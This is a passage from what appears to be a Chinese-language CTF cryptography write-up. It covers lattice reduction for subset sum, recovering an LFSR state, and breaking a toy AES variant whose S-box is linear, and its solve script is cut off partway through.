...&&...&&...\\
&&&...&-S
\end{bmatrix}</script><p>原因是,自己和可以被视作是一个小的向量乘进原先的a矩阵,所以答案可以通过LLL求出来.</p>
<blockquote>
<p>补充:经anon酱指正,子集和问题因为要限定向量最后的数字是1,而且限定前面的值全部是1或-1,所以有下面更强的格:</p>
<script type="math/tex; mode=display">\begin{bmatrix}2&&&&a_1\\
&2&&&a_2\\
&&2&&...\\
...&&...&2&a_n\\
1&1&...&1&S
\end{bmatrix}</script><p>也许能解一下,不然就只能带alpha然后各种调参了<br>hint:注意下面的格期望的变量是这个格式:(1,-1,1,-1,…,1,1,-1,-1,…,0)不是末尾-1的.</p>
</blockquote>
<h2 id="LFSR"><a href="#LFSR" class="headerlink" title="LFSR"></a>LFSR</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">LFSR</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, vec, mask</span>):</span><br><span class="line">        self.mask = mask</span><br><span class="line">        self.vec  = vec</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__next__</span>(<span class="params">self</span>):</span><br><span class="line">        self.vec = self.vec[<span class="number">1</span>:] + [<span class="built_in">sum</span>(self.vec[i]&amp;self.mask[i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">512</span>)) &amp; <span class="number">1</span>]</span><br><span class="line">        <span class="keyword">return</span> self.vec[-<span class="number">1</span>]</span><br></pre></td></tr></table></figure>
<p>生成脚本的大意是说,每次都会计算当前vec和mask与的和是不是奇数,然后丢掉最靠前的数字,把算出来的数字加到末尾.<br>只需要二倍mask和vec大小(他俩必须一样大)就能完整还原整个状态,即:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mat=[] <span class="comment"># 构建的矩阵</span></span><br><span class="line">mbt=[[],[],[]] <span class="comment"># 答案矩阵,注意是很多行而不是一行</span></span><br><span class="line">f=GF(<span class="number">2</span>) <span class="comment"># 因为奇偶要对2取模,所以在模2上进行</span></span><br><span class="line">A=Matrix(f,mat)</span><br><span class="line">B=Matrix(f,mbt)</span><br><span class="line">x=A.solve_right(B)</span><br><span class="line"><span class="built_in">print</span>(x) <span class="comment"># mask矩阵</span></span><br></pre></td></tr></table></figure><br>下面是逆向还原状态的脚本,假如mask[0]==0那么mask还得顺推直到找到第一个mask是1的才行,到时候再改.<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">inv</span>(<span class="params">msk,vec,tar</span>):</span><br><span class="line">	res=<span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">511</span>):</span><br><span class="line">		res+=vec[i]&amp;msk[i+<span class="number">1</span>]</span><br><span class="line">	res=res&amp;<span class="number">1</span></span><br><span class="line">	<span class="keyword">if</span> res==tar:</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">	<span class="keyword">elif</span> msk[<span class="number">0</span>]==<span class="number">1</span>:</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="keyword">assert</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure></p>
<h2 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h2><p>以stupid box 1为例.<br>加密:<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> zip_longest</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">pad = <span class="keyword">lambda</span> m: m + <span class="built_in">bytes</span>([<span class="number">16</span> - <span class="built_in">len</span>(m) % <span class="number">16</span>] * (<span class="number">16</span> - <span class="built_in">len</span>(m) % <span class="number">16</span>))</span><br><span class="line">xor = <span class="keyword">lambda</span> a, b: <span class="built_in">bytes</span>(aa ^ bb <span class="keyword">for</span> aa, bb <span class="keyword">in</span> zip_longest(a, b))</span><br><span class="line"></span><br><span class="line">stupid_box = [</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x60</span>, <span class="number">0x70</span>, <span class="number">0x40</span>, <span class="number">0x50</span>, <span class="number">0x20</span>, <span class="number">0x30</span>, <span class="number">0x81</span>, <span class="number">0x91</span>, <span class="number">0xe1</span>, <span class="number">0xf1</span>, <span class="number">0xc1</span>, <span class="number">0xd1</span>, <span class="number">0xa1</span>, <span class="number">0xb1</span>,</span><br><span class="line">    <span class="number">0x03</span>, <span class="number">0x13</span>, <span class="number">0x63</span>, <span class="number">0x73</span>, <span class="number">0x43</span>, <span class="number">0x53</span>, <span class="number">0x23</span>, <span class="number">0x33</span>, <span class="number">0x82</span>, <span class="number">0x92</span>, <span class="number">0xe2</span>, <span class="number">0xf2</span>, <span class="number">0xc2</span>, <span class="number">0xd2</span>, <span class="number">0xa2</span>, <span class="number">0xb2</span>,</span><br><span class="line">    <span class="number">0x07</span>, <span class="number">0x17</span>, <span class="number">0x67</span>, <span class="number">0x77</span>, <span class="number">0x47</span>, <span class="number">0x57</span>, <span class="number">0x27</span>, <span class="number">0x37</span>, <span class="number">0x86</span>, <span class="number">0x96</span>, <span class="number">0xe6</span>, <span class="number">0xf6</span>, <span class="number">0xc6</span>, <span class="number">0xd6</span>, <span class="number">0xa6</span>, <span class="number">0xb6</span>,</span><br><span class="line">    <span class="number">0x04</span>, <span class="number">0x14</span>, <span class="number">0x64</span>, <span class="number">0x74</span>, <span class="number">0x44</span>, <span class="number">0x54</span>, <span class="number">0x24</span>, <span class="number">0x34</span>, <span class="number">0x85</span>, <span class="number">0x95</span>, <span class="number">0xe5</span>, <span class="number">0xf5</span>, <span class="number">0xc5</span>, <span class="number">0xd5</span>, <span class="number">0xa5</span>, <span class="number">0xb5</span>,</span><br><span class="line">    <span class="number">0x06</span>, <span class="number">0x16</span>, <span class="number">0x66</span>, <span class="number">0x76</span>, <span class="number">0x46</span>, <span class="number">0x56</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x87</span>, <span class="number">0x97</span>, <span class="number">0xe7</span>, <span class="number">0xf7</span>, <span class="number">0xc7</span>, <span class="number">0xd7</span>, <span class="number">0xa7</span>, <span class="number">0xb7</span>,</span><br><span class="line">    <span class="number">0x05</span>, <span class="number">0x15</span>, <span class="number">0x65</span>, <span class="number">0x75</span>, <span class="number">0x45</span>, <span class="number">0x55</span>, <span class="number">0x25</span>, <span class="number">0x35</span>, <span class="number">0x84</span>, <span class="number">0x94</span>, <span class="number">0xe4</span>, <span class="number">0xf4</span>, <span class="number">0xc4</span>, <span class="number">0xd4</span>, <span class="number">0xa4</span>, <span class="number">0xb4</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x11</span>, <span class="number">0x61</span>, <span class="number">0x71</span>, <span class="number">0x41</span>, <span class="number">0x51</span>, <span class="number">0x21</span>, <span class="number">0x31</span>, <span class="number">0x80</span>, <span class="number">0x90</span>, <span class="number">0xe0</span>, <span class="number">0xf0</span>, <span class="number">0xc0</span>, <span class="number">0xd0</span>, <span class="number">0xa0</span>, <span class="number">0xb0</span>,</span><br><span class="line">    <span class="number">0x02</span>, <span class="number">0x12</span>, <span class="number">0x62</span>, <span class="number">0x72</span>, <span class="number">0x42</span>, <span class="number">0x52</span>, <span class="number">0x22</span>, <span class="number">0x32</span>, <span class="number">0x83</span>, <span class="number">0x93</span>, <span class="number">0xe3</span>, <span class="number">0xf3</span>, <span class="number">0xc3</span>, <span class="number">0xd3</span>, <span class="number">0xa3</span>, <span class="number">0xb3</span>,</span><br><span class="line">    <span class="number">0x0c</span>, <span class="number">0x1c</span>, <span class="number">0x6c</span>, <span class="number">0x7c</span>, <span class="number">0x4c</span>, <span class="number">0x5c</span>, <span class="number">0x2c</span>, <span class="number">0x3c</span>, <span class="number">0x8d</span>, <span class="number">0x9d</span>, <span class="number">0xed</span>, <span class="number">0xfd</span>, <span class="number">0xcd</span>, <span class="number">0xdd</span>, <span class="number">0xad</span>, <span class="number">0xbd</span>,</span><br><span class="line">    <span class="number">0x0f</span>, <span class="number">0x1f</span>, <span class="number">0x6f</span>, <span class="number">0x7f</span>, <span class="number">0x4f</span>, <span class="number">0x5f</span>, <span class="number">0x2f</span>, <span class="number">0x3f</span>, <span class="number">0x8e</span>, <span class="number">0x9e</span>, <span class="number">0xee</span>, <span class="number">0xfe</span>, <span class="number">0xce</span>, <span class="number">0xde</span>, <span class="number">0xae</span>, <span class="number">0xbe</span>,</span><br><span class="line">    <span class="number">0x0b</span>, <span class="number">0x1b</span>, <span class="number">0x6b</span>, <span class="number">0x7b</span>, <span class="number">0x4b</span>, <span class="number">0x5b</span>, <span class="number">0x2b</span>, <span class="number">0x3b</span>, <span class="number">0x8a</span>, <span class="number">0x9a</span>, <span class="number">0xea</span>, <span class="number">0xfa</span>, <span class="number">0xca</span>, <span class="number">0xda</span>, <span class="number">0xaa</span>, <span class="number">0xba</span>,</span><br><span class="line">    <span class="number">0x08</span>, <span class="number">0x18</span>, <span class="number">0x68</span>, <span class="number">0x78</span>, <span class="number">0x48</span>, <span class="number">0x58</span>, <span class="number">0x28</span>, <span class="number">0x38</span>, <span class="number">0x89</span>, <span class="number">0x99</span>, <span class="number">0xe9</span>, <span class="number">0xf9</span>, <span class="number">0xc9</span>, <span class="number">0xd9</span>, <span class="number">0xa9</span>, <span class="number">0xb9</span>,</span><br><span class="line">    <span class="number">0x0a</span>, <span class="number">0x1a</span>, <span class="number">0x6a</span>, <span class="number">0x7a</span>, <span class="number">0x4a</span>, <span class="number">0x5a</span>, <span class="number">0x2a</span>, <span class="number">0x3a</span>, <span class="number">0x8b</span>, <span class="number">0x9b</span>, <span class="number">0xeb</span>, <span class="number">0xfb</span>, <span class="number">0xcb</span>, <span class="number">0xdb</span>, <span class="number">0xab</span>, <span class="number">0xbb</span>,</span><br><span class="line">    <span class="number">0x09</span>, <span class="number">0x19</span>, <span class="number">0x69</span>, <span class="number">0x79</span>, <span class="number">0x49</span>, <span class="number">0x59</span>, <span class="number">0x29</span>, <span class="number">0x39</span>, <span class="number">0x88</span>, <span class="number">0x98</span>, <span class="number">0xe8</span>, <span class="number">0xf8</span>, <span class="number">0xc8</span>, <span class="number">0xd8</span>, <span class="number">0xa8</span>, <span class="number">0xb8</span>,</span><br><span class="line">    <span class="number">0x0d</span>, <span class="number">0x1d</span>, <span class="number">0x6d</span>, <span class="number">0x7d</span>, <span class="number">0x4d</span>, <span class="number">0x5d</span>, <span class="number">0x2d</span>, <span class="number">0x3d</span>, <span class="number">0x8c</span>, <span class="number">0x9c</span>, <span class="number">0xec</span>, <span class="number">0xfc</span>, <span class="number">0xcc</span>, <span class="number">0xdc</span>, <span class="number">0xac</span>, <span class="number">0xbc</span>,</span><br><span class="line">    <span class="number">0x0e</span>, <span class="number">0x1e</span>, <span class="number">0x6e</span>, <span class="number">0x7e</span>, <span class="number">0x4e</span>, <span class="number">0x5e</span>, <span class="number">0x2e</span>, <span class="number">0x3e</span>, <span class="number">0x8f</span>, <span class="number">0x9f</span>, <span class="number">0xef</span>, <span class="number">0xff</span>, <span class="number">0xcf</span>, <span class="number">0xdf</span>, <span class="number">0xaf</span>, <span class="number">0xbf</span></span><br><span class="line">]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shift_rows</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([</span><br><span class="line">        m[<span class="number">0x0</span>], m[<span class="number">0x5</span>], m[<span class="number">0xa</span>], m[<span class="number">0xf</span>],</span><br><span class="line">        m[<span class="number">0x4</span>], m[<span class="number">0x9</span>], m[<span class="number">0xe</span>], m[<span class="number">0x3</span>],</span><br><span class="line">        m[<span class="number">0x8</span>], m[<span class="number">0xd</span>], m[<span class="number">0x2</span>], m[<span class="number">0x7</span>],</span><br><span class="line">        m[<span class="number">0xc</span>], m[<span class="number">0x1</span>], m[<span class="number">0x6</span>], m[<span class="number">0xb</span>]</span><br><span class="line">    ])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub_bytes</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(stupid_box[mm] <span class="keyword">for</span> mm <span class="keyword">in</span> m)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mix_columns</span>(<span class="params">m</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_gf_mul</span>(<span class="params">a, b</span>):</span><br><span class="line">        c = <span class="number">0</span></span><br><span class="line">        d = a</span><br><span class="line">        <span class="keyword">for</span> bit <span class="keyword">in</span> <span class="built_in">map</span>(<span class="built_in">int</span>, <span class="built_in">reversed</span>(<span class="built_in">bin</span>(b)[<span class="number">2</span>:])):</span><br><span class="line">            <span class="keyword">if</span> bit:</span><br><span class="line">                c ^= d</span><br><span class="line">            d = d &lt;&lt; <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> d &amp; <span class="number">0x100</span>:</span><br><span class="line">                d ^= <span class="number">0x11b</span></span><br><span class="line">        <span class="keyword">return</span> c</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_mix_column</span>(<span class="params">col</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>([</span><br><span class="line">            _gf_mul(col[<span class="number">0</span>], <span class="number">2</span>) ^ _gf_mul(col[<span class="number">1</span>], <span class="number">3</span>) ^ _gf_mul(col[<span class="number">2</span>], <span class="number">1</span>) ^ _gf_mul(col[<span class="number">3</span>], <span class="number">1</span>),</span><br><span class="line">            _gf_mul(col[<span class="number">0</span>], <span class="number">1</span>) ^ _gf_mul(col[<span class="number">1</span>], <span class="number">2</span>) ^ _gf_mul(col[<span class="number">2</span>], <span class="number">3</span>) ^ _gf_mul(col[<span class="number">3</span>], <span class="number">1</span>),</span><br><span class="line">            _gf_mul(col[<span class="number">0</span>], <span class="number">1</span>) ^ _gf_mul(col[<span class="number">1</span>], <span class="number">1</span>) ^ _gf_mul(col[<span class="number">2</span>], <span class="number">2</span>) ^ _gf_mul(col[<span class="number">3</span>], <span class="number">3</span>),</span><br><span class="line">            _gf_mul(col[<span class="number">0</span>], <span class="number">3</span>) ^ _gf_mul(col[<span class="number">1</span>], <span class="number">1</span>) ^ _gf_mul(col[<span class="number">2</span>], <span class="number">1</span>) ^ _gf_mul(col[<span class="number">3</span>], <span class="number">2</span>)</span><br><span class="line">        ])</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>([</span><br><span class="line">        *_mix_column(m[:<span class="number">4</span>]),</span><br><span class="line">        *_mix_column(m[<span class="number">4</span>:<span class="number">8</span>]),</span><br><span class="line">        *_mix_column(m[<span class="number">8</span>:<span class="number">12</span>]),</span><br><span class="line">        *_mix_column(m[<span class="number">12</span>:<span class="number">16</span>])</span><br><span class="line">    ])</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add_round_key</span>(<span class="params">m, k</span>):</span><br><span class="line">    <span class="keyword">return</span> xor(m, k)</span><br><span class="line">RCON = [<span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x04</span>, <span class="number">0x08</span>, <span class="number">0x10</span>, <span class="number">0x20</span>, <span class="number">0x40</span>, <span class="number">0x80</span>, <span class="number">0x1B</span>, <span class="number">0x36</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">key_schedule</span>(<span class="params">k</span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(k) == <span class="number">16</span></span><br><span class="line">    sub_keys = [k]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">        sub_key = <span class="built_in">bytes</span>(</span><br><span class="line">            stupid_box[w1] ^ w2 ^ rr</span><br><span class="line">                <span class="keyword">for</span> w1, w2, rr <span class="keyword">in</span> <span class="built_in">zip</span>(</span><br><span class="line">                    sub_keys[-<span class="number">1</span>][<span class="number">13</span>:] + sub_keys[-<span class="number">1</span>][<span class="number">12</span>:<span class="number">13</span>],</span><br><span class="line">                    sub_keys[-<span class="number">1</span>][:<span class="number">4</span>],</span><br><span class="line">                    (RCON[i], <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">                )</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            sub_key += xor(sub_keys[-<span class="number">1</span>][<span class="number">4</span>*j+<span class="number">4</span>:<span class="number">4</span>*j+<span class="number">8</span>], sub_key[<span class="number">4</span>*j:<span class="number">4</span>*j+<span class="number">4</span>])</span><br><span class="line">        sub_keys.append(sub_key)</span><br><span class="line">    <span class="keyword">return</span> sub_keys</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">m, k</span>):</span><br><span class="line">    sub_keys = key_schedule(k)</span><br><span class="line">    m = add_round_key(m, sub_keys[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">        m = sub_bytes(m)</span><br><span class="line">        m = shift_rows(m)</span><br><span class="line">        m = mix_columns(m)</span><br><span class="line">        m = add_round_key(m, sub_keys[i+<span class="number">1</span>])</span><br><span class="line">    m = sub_bytes(m)</span><br><span class="line">    m = shift_rows(m)</span><br><span class="line">    m = add_round_key(m, sub_keys[<span class="number">10</span>])</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt_ecb</span>(<span class="params">m, k</span>):</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(m) % <span class="number">16</span> == <span class="number">0</span> <span class="keyword">and</span> <span class="built_in">len</span>(k) == <span class="number">16</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;&#x27;</span>.join(encrypt(m[i:i+<span class="number">16</span>], k) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(m), <span class="number">16</span>))</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(flag) % <span class="number">16</span> == <span class="number">0</span></span><br><span class="line">key = os.urandom(<span class="number">16</span>)</span><br><span class="line">ct = encrypt_ecb(pad(flag), key)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;ct = &#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure></p>
<p>观察到:上面是一个标准的AES-128-ECB代码实现,唯一不同的是上面的S盒与标准的S盒有很大的不同,这可以成为攻击的起点:<br>经过一系列测试我们发现这个题目中的s盒有这个性质:假设s盒取址变换为f(x),那么有</p>
<script type="math/tex; mode=display">f(x\,\mathrm{xor}\, y)=f(x)\,\mathrm{xor} \,f(y)</script><p>而且我们发现原始密文最后有一整个分块的已知明文(pad函数立大功),所以整个变换被理解为”线性的”,我们不必通过一堆轮密钥尝试反推k.<br>解密(ds写的,未经过审计):<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> zip_longest</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">pad = <span class="keyword">lambda</span> m: m + <span class="built_in">bytes</span>([<span class="number">16</span> - <span class="built_in">len</span>(m) % <span class="number">16</span>] * (<span class="number">16</span> - <span class="built_in">len</span>(m) % <span class="number">16</span>))</span><br><span class="line">xor = <span class="keyword">lambda</span> a, b: <span class="built_in">bytes</span>(aa ^ bb <span class="keyword">for</span> aa, bb <span class="keyword">in</span> zip_longest(a, b))</span><br><span class="line"></span><br><span class="line">stupid_box = [</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x10</span>, <span class="number">0x60</span>, <span class="number">0x70</span>, <span class="number">0x40</span>, <span class="number">0x50</span>, <span class="number">0x20</span>, <span class="number">0x30</span>, <span class="number">0x81</span>, <span class="number">0x91</span>, <span class="number">0xe1</span>, <span class="number">0xf1</span>, <span class="number">0xc1</span>, <span class="number">0xd1</span>, <span class="number">0xa1</span>, <span class="number">0xb1</span>,</span><br><span class="line">    <span class="number">0x03</span>, <span class="number">0x13</span>, <span class="number">0x63</span>, <span class="number">0x73</span>, <span class="number">0x43</span>, <span class="number">0x53</span>, <span class="number">0x23</span>, <span class="number">0x33</span>, <span class="number">0x82</span>, <span class="number">0x92</span>, <span class="number">0xe2</span>, <span class="number">0xf2</span>, <span class="number">0xc2</span>, <span class="number">0xd2</span>, <span class="number">0xa2</span>, <span class="number">0xb2</span>,</span><br><span class="line">    <span class="number">0x07</span>, <span class="number">0x17</span>, <span class="number">0x67</span>, <span class="number">0x77</span>, <span class="number">0x47</span>, <span class="number">0x57</span>, <span class="number">0x27</span>, <span class="number">0x37</span>, <span class="number">0x86</span>, <span class="number">0x96</span>, <span class="number">0xe6</span>, <span class="number">0xf6</span>, <span class="number">0xc6</span>, <span class="number">0xd6</span>, <span class="number">0xa6</span>, <span class="number">0xb6</span>,</span><br><span class="line">    <span class="number">0x04</span>, <span class="number">0x14</span>, <span class="number">0x64</span>, <span class="number">0x74</span>, <span class="number">0x44</span>, <span class="number">0x54</span>, <span class="number">0x24</span>, <span class="number">0x34</span>, <span class="number">0x85</span>, <span class="number">0x95</span>, <span class="number">0xe5</span>, <span class="number">0xf5</span>, <span class="number">0xc5</span>, <span class="number">0xd5</span>, <span class="number">0xa5</span>, <span class="number">0xb5</span>,</span><br><span class="line">    <span class="number">0x06</span>, <span class="number">0x16</span>, <span class="number">0x66</span>, <span class="number">0x76</span>, <span class="number">0x46</span>, <span class="number">0x56</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x87</span>, <span class="number">0x97</span>, <span class="number">0xe7</span>, <span class="number">0xf7</span>, <span class="number">0xc7</span>, <span class="number">0xd7</span>, <span class="number">0xa7</span>, <span class="number">0xb7</span>,</span><br><span class="line">    <span class="number">0x05</span>, <span class="number">0x15</span>, <span class="number">0x65</span>, <span class="number">0x75</span>, <span class="number">0x45</span>, <span class="number">0x55</span>, <span class="number">0x25</span>, <span class="number">0x35</span>, <span class="number">0x84</span>, <span class="number">0x94</span>, <span class="number">0xe4</span>, <span class="number">0xf4</span>, <span class="number">0xc4</span>, <span class="number">0xd4</span>, <span class="number">0xa4</span>, <span class="number">0xb4</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x11</span>, <span class="number">0x61</span>, <span class="number">0x71</span>, <span class="number">0x41</span>, <span class="number">0x51</span>, <span class="number">0x21</span>, <span class="number">0x31</span>, <span class="number">0x80</span>, <span 